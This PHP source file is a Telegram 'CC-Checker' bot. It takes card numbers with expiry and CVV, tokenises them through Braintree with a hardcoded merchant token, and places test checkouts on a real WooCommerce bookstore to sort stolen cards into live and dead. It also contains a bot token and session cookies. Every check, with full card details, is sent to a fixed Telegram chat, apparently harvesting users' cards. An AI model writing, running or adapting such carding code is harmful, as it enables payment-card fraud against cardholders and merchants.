<?php
error_reporting(0);
$botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw";
$website = "https://api.telegram.org/bot".$botToken;

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);


$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];
$info = json_encode($update,JSON_PRETTY_PRINT);




$cmds11 = "
<b>Hey, welcome to this Bot! Below I show you all available commands:</b>
<u>Bin Checker:</u><code> !bin xxxxxx</code>
<u>Card-Check:</u> <code> !pf xxxxxxxxxxxxxxxx|xx|xx|xxx</code>";
 
switch($message) {
       
        case "/start":
        $reply = $update["message"]["message_id"];
                
                file_get_contents($website.'/sendMessage?chat_id='.$chatId.'&text='.urlencode("Hey! I am a CC-Checker bot with a few extras. Send /list for a list of all commands!").'&reply_to_message_id='.$reply.'&parse_mode=HTML');
                break;
        case "/list":
        $reply = $update["message"]["message_id"];
                file_get_contents($website.'/sendMessage?chat_id='.$chatId.'&text='.urlencode($cmds11).'&reply_to_message_id='.$reply.'&parse_mode=HTML');
                break;
                case "/info":
                $reply = $update["message"]["message_id"];
                file_get_contents($website.'/sendMessage?chat_id='.$chatId.'&text='.urlencode($info).'&reply_to_message_id='.$reply.'&parse_mode=HTML');
                break;
       
               
       
}

if (strpos($message, '!bin') !== false) {
$reply = $update["message"]["message_id"];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

$ccdetails = explode(" ",$message);
$separator = explode("|", $ccdetails[1]);
$cc = $separator[0];
$ano = $separator[2];
$mes = $separator[1];
$cvv = $separator[3];
$bin = substr($cc,0,6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://bins.su');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'');
$result = curl_exec($ch);
curl_close($ch);
 preg_match_all('(<tr><td>'.$bin.'</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>)siU', $result, $data);
 $country = $data[1][0];
 $vendor = $data[2][0];
 $type = $data[3][0];
 $level = $data[4][0];
 $bank = $data[5][0];

if(strlen($bin)<6){
$rep = '❌Invalid Bin';
file_get_contents($website.'/sendMessage?chat_id='.$chatId.'&text='.urlencode($rep).'&reply_to_message_id='.$reply.'&parse_mode=HTML');
}else{


$response = '
<b>BRAND: </b>'.$vendor.'
<b>TYPE: </b>'.$type.'
<b>LEVEL: </b>'.$level.'
<b>BANK: </b>'.$bank.' 
<b>COUNTRY: </b>'.$country.' '.$flag.'
<b>CHECKED BY:</b> '.$username.'
<b>BOT BY:</b>TEAM SL';

file_get_contents($website.'/sendMessage?chat_id='.$chatId.'&text='.urlencode($response).'&reply_to_message_id='.$reply.'&parse_mode=HTML');
    }            
   
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
$ii = [
  'cookie' => mt_rand().'.txt'
];

$pathhhhhh = ''.getcwd().'/COOKIE';

if (!is_dir($pathhhhhh)) {  
    mkdir($pathhhhhh, 0777, true);
}
$d1 = getcwd();
$d = str_replace('\\', '/', $d1);
$executionStartTime = microtime(true);
///////TYPE CARD////
$firstnum = $I[0];
if($firstnum == '4'){
$typee = 'Visa';
$typee2 = 'VISA';
}if($firstnum == '5'){
$typee = 'mastercard';
$typee2 = 'MASTERCARD';
}





if (strpos($message, '!pf') !== false) {
$reply = $update["message"]["message_id"];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function pasabog($sh8, $boang)
{
  $wan = str_replace($sh8, $sh8[0], $boang);
  $tobol = explode($sh8[0], $wan);
  return $tobol;
}

$ccdetails = explode(" ",$message);
$separator = explode("|", $ccdetails[1]);
$cc = $separator[0];
$ano = $separator[2];
$ano2 = substr($ano, 2,4);
$mes = $separator[1];
$cvv = $separator[3];
$bin = substr($cc,0,6);

$list = file_get_contents("https://namegenerator.in/assets/refresh.php?location=united%20states");
$list2 = json_decode($list, true);
$name1 = $list2['name'];
$name = explode(" ", $name1)[0];
$last = explode(" ", $name1)[1];
$street = $list2['street1'];
$city1 = $list2['street2'];
$city = explode(",", $city1)[0];
$state = explode(" ", $city1)[1];
$zip = explode(" ", $city1)[2];
//$phone = $list2['phone'];
$email = $name.$last.rand(111111,999999).'@gmail.com';
$pass = $name.rand(11111,99999);
$phone = rand(11111111111,88888888888);
///////////==<(RANDOM USER)))=//////=====
$pathhhhhh = ''.getcwd().'/COOKIE';

if (!is_dir($pathhhhhh)) {  
    mkdir($pathhhhhh, 0777, true);
}
$d1 = getcwd();
$d = str_replace('\\', '/', $d1);
$executionStartTime = microtime(true);

$rp1 = array(
 1 => 'xdfgglis-rotate:0fozxul6qziy',
  2 => 'buzcugvr-rotate:na05fj245weq',

    ); 
    $rotate = $rp1[array_rand($rp1)];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://bins.su');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'');
$result = curl_exec($ch);
curl_close($ch);
 preg_match_all('(<tr><td>'.$bin.'</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>)siU', $result, $data);
 $country = $data[1][0];
 $vendor = $data[2][0];
 $type = $data[3][0];
 $level = $data[4][0];
 $bank = $data[5][0];
$cbin = substr($cc, 0,6);

#######START NOW######

//////--------FIRST CURL GRAPHQL------------////
$ch = curl_init();
//PROXY
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"b4ac5c06-bc95-473b-b19a-6fb975173fe7"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
curl_setopt($ch, CURLOPT_HEADER, 0);
//// Short codes $cc $mes $ano $cvv $firstname $lastname $street $zip $phone $state $email/////////////////////
$headers = array();
$headers[] = 'Host: payments.braintree-api.com';
$headers[] = 'Accept: */*';
$headers[] = 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2MTYzMTg1NDAsImp0aSI6IjI5OGNjY2VmLWQzNTMtNGIzMS04YmI2LWIxNDNlODJjZjRhMSIsInN1YiI6Inc5Nmt5cDU1Y3FwcW41Z3IiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Inc5Nmt5cDU1Y3FwcW41Z3IiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.6Rjz6qowqIlr2BnphPmfpjYvokWLN8DilgK6h6T_1nNcyPt2dSiv3Tn8hkOw0QURhy8-9b1clOHIOZXhlACOvg';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://assets.braintreegateway.com';
$headers[] = 'Referer: https://assets.braintreegateway.com/';
$headers[] = 'braintree-version: 2018-05-10';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 10; MI 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36';
$headers[] = 'Sec-Fetch-Mode: same-site';
$headers[] = 'Sec-Fetch-Mode: no-cors';
$headers[] = 'Sec-Fetch-Mode: script';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resulta = curl_exec($ch);
$token = trim(strip_tags(getStr($resulta,'"token":"','"')));
#echo "<br>token: $token";
//////////////////////////[ErrorFound404]//////////=========[Graphl]
//$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'nosmwbwz-rotate:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'nosmwbwz-rotate:u5uei2b48zh8');
////////-----------2ND CURL CHECKOUT-------//////
$ch = curl_init();
//PROXY
curl_setopt($ch, CURLOPT_URL, 'https://whitefire-publishing.com/read/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Charlene&billing_last_name=Ganda&billing_company=&billing_country=US&billing_address_1=26517+Danti+Court&billing_address_2=Account+No.%C2%A052-546944&billing_city=Hayward&billing_state=CA&billing_postcode=96590&billing_phone=6508730750&billing_email=bertolabsu125763%40gmail.com&order_comments=&wc-points-rewards-max-points=0&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=0&wc-braintree-credit-card-3d-secure-order-total=14.97&wc_braintree_credit_card_payment_nonce='.$token.'&wc_braintree_paypal_payment_nonce=&wc_braintree_paypal_amount=14.97&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&terms=on&terms-field=1&woocommerce-process-checkout-nonce=bdfb1b29c2&_wp_http_referer=%2Fread%2F%3Fwc-ajax%3Dupdate_order_review');
curl_setopt($ch, CURLOPT_HEADER, 0);
//// Short codes $cc $mes $ano $cvv $firstname $lastname $street $zip $phone $state $email/////////////////////
$headers = array();
$headers[] = 'Host: whitefire-publishing.com';
$headers[] = 'x-requested-with: XMLHttpRequest';
//$headers[] = 'Upgrade-Insecure-Requests:1';
//$heasers[] = 'Cache-Control:max-age=0';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Cookie: wp_woocommerce_session_ad5cefb29f2d4e012793c687d31082f3=722fc8678b968977d9fcd83c92e151ab%7C%7C1616251221%7C%7C1616247621%7C%7C7c902a6c74e0b570fbdfa7f020156b3e; woocommerce_items_in_cart=1; woocommerce_cart_hash=4f19b47467d8270255244ad7ddb48327; _ga=GA1.2.48530751.1616078268; sib_cuid=b9d05401-04d4-4047-bf1c-067a875a625e; etBloomCookie_optin_2=true; et_bloom_optin_optin_2_33_imp=true; _gid=GA1.2.34866678.1616232082; SGPBShowingLimitationDomain4403={"openingCount":1,"openingPage":""}';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Origin: https://whitefire-publishing.com';
$headers[] = 'Referer: https://whitefire-publishing.com/read/checkout/';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 10; MI 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36';
$headers[] = 'Sec-Fetch-Mode: cors';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$pagamento = curl_exec($ch);
$message = trim(strip_tags(getStr($pagamento,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t','\t\t<\/li>\n\t<\/ul>\n')));

unlink($namefile2);
curl_close($ch);


if (strpos($pagamento, '"success"')) {
  
echo '<span class="badge badge-dark"> LIVE #CVV </span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> CVC MATCHED | JUICY 💜 </span></br>';
$botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw ";
$chat_id = "1291071243";
$message = "✅ APPROVED CVV - AUTH
<b>💳Card: </b>'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'
<b>🔎BRAND: </b>'.$vendor.'
<b>🔎TYPE: </b>'.$type.'
<b>🔎LEVEL: </b>'.$level.'
<b>🔎BANK: </b>'.$bank.' 
<b>🔎COUNTRY: </b>'.$country.' '.$flag.'
<b>📝CHECKED BY:</b> '.$username.'
<b>🔔Response: CVV MATCHED ✓
<b>©️Made By: JUICY";
$bot_url    =  "https://api.telegram.org/bot$botToken/";
$url = $bot_url."sendMessage?chat_id=".$chatid."&text=".urlencode($message);
file_get_contents($url);

$bot_url    =  "https://api.telegram.org/bot$botToken/";
$url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
file_get_contents($url);
} 
elseif (strpos($pagamento, "The provided address does not match the billing address for cardholder. Please verify the address and try again")) {
  
echo '<span class="badge badge-dark"> LIVE #CVV </span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> CVC MATCHED | JUICY 💜 </span></br>';
$botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw ";
$chat_id = "1291071243";
$message = "✅ APPROVED CVV - AUTH
<b>💳Card: </b>'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'
<b>🔎BRAND: </b>'.$vendor.'
<b>🔎TYPE: </b>'.$type.'
<b>🔎LEVEL: </b>'.$level.'
<b>🔎BANK: </b>'.$bank.' 
<b>🔎COUNTRY: </b>'.$country.' '.$flag.'
<b>📝CHECKED BY:</b> '.$username.'
<b>🔔Response: CVV MATCHED ✓
<b>©️Made By: JUICY";
$bot_url    =  "https://api.telegram.org/bot$botToken/";
$url = $bot_url."sendMessage?chat_id=".$chatid."&text=".urlencode($message);
file_get_contents($url);

$bot_url    =  "https://api.telegram.org/bot$botToken/";
$url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
file_get_contents($url);
}
elseif (strpos($pagamento, "We cannot process your order with the payment information that you provided. Please use a different payment account or an alternate payment method.")) {
echo '<span class="badge badge-pink"> #DEAD </span> <span class="badge badge-pink">'.$lista.'</span> <span class="badge badge-pink"> '.$amount2.' </span> <span class="badge badge-pink">Cannot Process| JUICY 💜</span> <br>';
$botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw ";
$chat_id = "1291071243";
$message = "X DECLINED
<b>💳Card: </b>'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'
<b>🔎BRAND: </b>'.$vendor.'
<b>🔎TYPE: </b>'.$type.'
<b>🔎LEVEL: </b>'.$level.'
<b>🔎BANK: </b>'.$bank.' 
<b>🔎COUNTRY: </b>'.$country.' '.$flag.'
<b>📝CHECKED BY:</b> '.$username.'
<b>🔔Response:DECLINED  
<b>©️Made By: JUICY";
$bot_url    =  "https://api.telegram.org/bot$botToken/";
$url = $bot_url."sendMessage?chat_id=".$chatid."&text=".urlencode($message);
file_get_contents($url);

$bot_url    =  "https://api.telegram.org/bot$botToken/";
$url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
file_get_contents($url);
}
elseif (strpos($pagamento, "We were unable to process your order, please try again.")) {
echo '<span class="badge badge-pink"> #DEAD </span> <span class="badge badge-pink">'.$lista.'</span> <span class="badge badge-pink">Recode Cookie </span> <span class="badge badge-pink">JUICY 💜</span> <br>';
}
elseif(strpos($pagamento, "The provided card was declined, please use an alternate card or other form of payment.")) {
echo '<span class="badge badge-pink"> #DEAD </span> <span class="badge badge-pink">'.$lista.'</span> <span class="badge badge-pink">Declined </span> <span class="badge badge-pink">JUICY 💜</span> <br>';
$botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw ";
$chat_id = "1291071243";
$message = "X DECLINED
<b>💳Card: </b>'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'
<b>🔎BRAND: </b>'.$vendor.'
<b>🔎TYPE: </b>'.$type.'
<b>🔎LEVEL: </b>'.$level.'
<b>🔎BANK: </b>'.$bank.' 
<b>🔎COUNTRY: </b>'.$country.' '.$flag.'
<b>📝CHECKED BY:</b> '.$username.'
<b>🔔Response:DECLINED
<b>©️Made By: JUICY";
$bot_url    =  "https://api.telegram.org/bot$botToken/";
$url = $bot_url."sendMessage?chat_id=".$chatid."&text=".urlencode($message);
file_get_contents($url);

$bot_url    =  "https://api.telegram.org/bot$botToken/";
$url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
file_get_contents($url);
}
elseif(strpos($pagamento, "The card verification number does not match. Please re-enter and try again.")) {
  echo '<span class="badge badge-dark"> LIVE #CCN </span> <span class="badge badge-warning"> '.$lista.' </span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-warning">✓</span> <span class="badge badge-warning"> CCN Match | JUICY 💜</span> <br>';
$botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw ";
$chat_id = "1291071243";
$message = "✅ APPROVED CCN - AUTH
<b>💳Card: </b>'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.''
<b>🔎BRAND: </b>'.$vendor.'
<b>🔎TYPE: </b>'.$type.'
<b>🔎LEVEL: </b>'.$level.'
<b>🔎BANK: </b>'.$bank.' 
<b>🔎COUNTRY: </b>'.$country.' '.$flag.'
<b>📝CHECKED BY:</b> '.$username.'
<b>🔔Response:CCN MATCH ✓
<b>©️Made By: JUICY";
$bot_url    =  "https://api.telegram.org/bot$botToken/";
$url = $bot_url."sendMessage?chat_id=".$chatid."&text=".urlencode($message);
file_get_contents($url);

$bot_url    =  "https://api.telegram.org/bot$botToken/";
$url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
file_get_contents($url);
}
else{
echo '<span class="badge badge-pink"> #DEAD </span> <span class="badge badge-pink">'.$lista.'</span> <span class="badge badge-pink">'.$message.' </span> <span class="badge badge-pink">JUICY 💜</span> <br>';}
$botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw ";
$chat_id = "1291071243";
$message = "DEAD
<b>💳Card: </b>'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.''
<b>🔎BRAND: </b>'.$vendor.'
<b>🔎TYPE: </b>'.$type.'
<b>🔎LEVEL: </b>'.$level.'
<b>🔎BANK: </b>'.$bank.' 
<b>🔎COUNTRY: </b>'.$country.' '.$flag.'
<b>📝CHECKED BY:</b> '.$username.'
<b>🔔Response: DEAD
<b>©️Made By: JUICY";
$bot_url    =  "https://api.telegram.org/bot$botToken/";
$url = $bot_url."sendMessage?chat_id=".$chatid."&text=".urlencode($message);
file_get_contents($url);

$bot_url    =  "https://api.telegram.org/bot$botToken/";
$url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
file_get_contents($url);
}

?>